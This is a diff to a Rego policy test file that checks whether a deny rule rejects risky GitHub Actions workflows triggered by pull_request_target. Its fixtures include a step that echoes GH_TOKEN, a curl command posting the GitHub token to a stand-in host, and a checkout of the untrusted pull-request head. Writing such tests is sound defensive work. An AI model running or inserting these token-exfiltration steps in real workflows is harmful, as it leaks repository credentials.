@@ -63,6 +63,42 @@ test_rejects_native_receipt_provenance_with_write_permission if {
 	contains(msg, "must not use pull_request_target")
 }
 
+test_rejects_native_receipt_provenance_with_changed_verifier_step if {
+	base := native_receipt_provenance_fixture
+	steps := [
+		base.jobs.verify.steps[0],
+		object.union(base.jobs.verify.steps[1], {"run": "echo \"$GH_TOKEN\""}),
+	]
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_extra_step if {
+	base := native_receipt_provenance_fixture
+	steps := array.concat(base.jobs.verify.steps, [{"run": "curl --data '${{ github.token }}' https://example.invalid"}])
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_with_head_checkout if {
+	base := native_receipt_provenance_fixture
+	checkout := object.union(base.jobs.verify.steps[0], {"with": object.union(
+		base.jobs.verify.steps[0].with,
+		{"ref": "${{ github.event.pull_request.head.sha }}"},
+	)})
+	workflow := object.union(base, {"jobs": {"verify": object.union(
+		base.jobs.verify,
+		{"steps": [checkout, base.jobs.verify.steps[1]]},
+	)}})
+	violations := deny with input as workflow
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
 test_rejects_public_live_command_output if {
 	violations := deny with input as workflow_with_live_run("bash scripts/ci/install-kubeconfig.sh")
 	some msg in violations
@@ -581,17 +617,12 @@ workflow_with_images(docker_action, job_container, service_image) := {
 
 native_receipt_provenance_fixture := {
 	"name": "Verify Native Chainguard Receipt Provenance",
-	"on": {
+	"true": {
 		"push": {"branches": ["main"]},
 		"pull_request_target": {"branches": ["main"], "types": ["opened", "reopened", "synchronize"]},
 	},
 	"permissions": {},
-	"jobs": {"verify": {
-		"runs-on": "ubuntu-24.04",
-		"timeout-minutes": 10,
-		"permissions": {"actions": "read", "contents": "read"},
-		"steps": [{"run": "true"}],
-	}},
+	"jobs": {"verify": native_receipt_provenance_job},
 }
 
 workflow_with_live_run(run) := {
